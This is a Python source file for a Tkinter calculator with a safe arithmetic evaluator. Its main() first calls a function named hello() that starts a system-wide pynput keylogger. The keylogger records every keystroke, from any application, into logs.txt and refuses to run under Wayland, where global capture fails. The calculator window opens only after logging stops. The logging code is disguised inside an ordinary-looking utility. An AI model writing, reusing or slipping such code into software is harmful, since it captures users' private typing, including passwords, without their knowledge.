import ast
import operator
import tkinter as tk
import os
import sys
from pynput import keyboard

LOG_FILE = "logs.txt"


def check_display_server():
    """Warn if running under Wayland, where pynput won't work globally."""
    session = os.environ.get("XDG_SESSION_TYPE", "").lower()
    if session == "wayland":
        print("[!] Wayland detected. pynput cannot capture global keys on Wayland.")
        print("    Please log out and choose an 'X11' or 'Xorg' session, then run again.")
        sys.exit(1)
    elif session == "x11":
        print("[+] X11 detected. Keylogger will work.")
    else:
        print("[?] Could not detect display server. Assuming X11...")


def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name.upper()}]"

    if key == keyboard.Key.enter:
        char = "\n"
    elif key == keyboard.Key.space:
        char = " "
    elif key == keyboard.Key.tab:
        char = "\t"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(char)
        f.flush()


def on_release(key):
    if key == keyboard.Key.esc:
        print("\nESC pressed - stopping logger.")
        return False


def hello():
    check_display_server()
    print(f"Logging keystrokes to '{os.path.abspath(LOG_FILE)}'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def safe_eval(expression):
    ops = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.Mod: operator.mod,
        ast.USub: operator.neg,
        ast.UAdd: operator.pos,
    }

    def _eval(node):
        if isinstance(node, ast.Expression):
            return _eval(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int, float)):
                return node.value
            raise ValueError("Invalid constant")
        if isinstance(node, ast.BinOp):
            op = ops.get(type(node.op))
            if op is None:
                raise ValueError("Unsupported operator")
            return op(_eval(node.left), _eval(node.right))
        if isinstance(node, ast.UnaryOp):
            op = ops.get(type(node.op))
            if op is None:
                raise ValueError("Unsupported operator")
            return op(_eval(node.operand))
        raise ValueError("Invalid expression")

    return _eval(ast.parse(expression, mode="eval"))


def evaluate(expression):
    translated = expression.replace("×", "*").replace("÷", "/").replace("−", "-")
    return safe_eval(translated)


def format_result(value):
    if isinstance(value, float) and value.is_integer():
        return str(int(value))
    return str(value)


def main():
    hello()
    root = tk.Tk()
    root.title("Calculator")
    root.configure(bg="#202020")
    root.resizable(False, False)

    state = {"expr": ""}
    display_var = tk.StringVar(value="0")

    display = tk.Label(
        root,
        textvariable=display_var,
        font=("Segoe UI", 28),
        bg="#202020",
        fg="white",
        anchor="e",
        padx=12,
        pady=12,
    )
    display.grid(row=0, column=0, columnspan=4, sticky="nsew")

    def refresh():
        display_var.set(state["expr"] or "0")

    def press(char):
        state["expr"] += char
        refresh()

    def clear():
        state["expr"] = ""
        refresh()

    def backspace():
        state["expr"] = state["expr"][:-1]
        refresh()

    def equals(event=None):
        text = state["expr"]
        if not text:
            return
        try:
            result_text = format_result(evaluate(text))
        except ZeroDivisionError:
            result_text = "Error: div by zero"
        except Exception:
            result_text = "Error"

        display_var.set(result_text)
        state["expr"] = "" if result_text.startswith("Error") else result_text

    colors = {
        "num": {"bg": "#3a3a3a", "fg": "white", "active": "#4a4a4a"},
        "op": {"bg": "#ff9500", "fg": "white", "active": "#ffab40"},
        "fn": {"bg": "#5a5a5a", "fg": "white", "active": "#6a6a6a"},
        "eq": {"bg": "#2e8b57", "fg": "white", "active": "#3aa06a"},
    }

    buttons = [
        ("C",  0, 0, clear,                 "fn"),
        ("(",  0, 1, lambda: press("("),    "fn"),
        (")",  0, 2, lambda: press(")"),    "fn"),
        ("÷",  0, 3, lambda: press("÷"),    "op"),

        ("7",  1, 0, lambda: press("7"),    "num"),
        ("8",  1, 1, lambda: press("8"),    "num"),
        ("9",  1, 2, lambda: press("9"),    "num"),
        ("×",  1, 3, lambda: press("×"),    "op"),

        ("4",  2, 0, lambda: press("4"),    "num"),
        ("5",  2, 1, lambda: press("5"),    "num"),
        ("6",  2, 2, lambda: press("6"),    "num"),
        ("−",  2, 3, lambda: press("−"),    "op"),

        ("1",  3, 0, lambda: press("1"),    "num"),
        ("2",  3, 1, lambda: press("2"),    "num"),
        ("3",  3, 2, lambda: press("3"),    "num"),
        ("+",  3, 3, lambda: press("+"),    "op"),

        ("⌫",  4, 0, backspace,             "fn"),
        ("0",  4, 1, lambda: press("0"),    "num"),
        (".",  4, 2, lambda: press("."),    "num"),
        ("=",  4, 3, equals,                "eq"),
    ]

    for text, r, c, cmd, kind in buttons:
        scheme = colors[kind]
        btn = tk.Button(
            root,
            text=text,
            command=cmd,
            font=("Segoe UI", 16, "bold"),
            width=5,
            height=2,
            bd=0,
            relief="flat",
            bg=scheme["bg"],
            fg=scheme["fg"],
            activebackground=scheme["active"],
            activeforeground="white",
            highlightthickness=0,
        )
        btn.grid(row=r + 1, column=c, padx=4, pady=4, sticky="nsew")

    def on_key(event):
        char = event.char
        if char in "0123456789.+-*/()":
            press({"*": "×", "/": "÷", "-": "−"}.get(char, char))
        elif event.keysym in ("Return", "KP_Enter"):
            equals()
        elif event.keysym == "BackSpace":
            backspace()
        elif event.keysym in ("Escape", "Delete"):
            clear()

    root.bind("<Key>", on_key)
    root.mainloop()


if __name__ == "__main__":
    main()
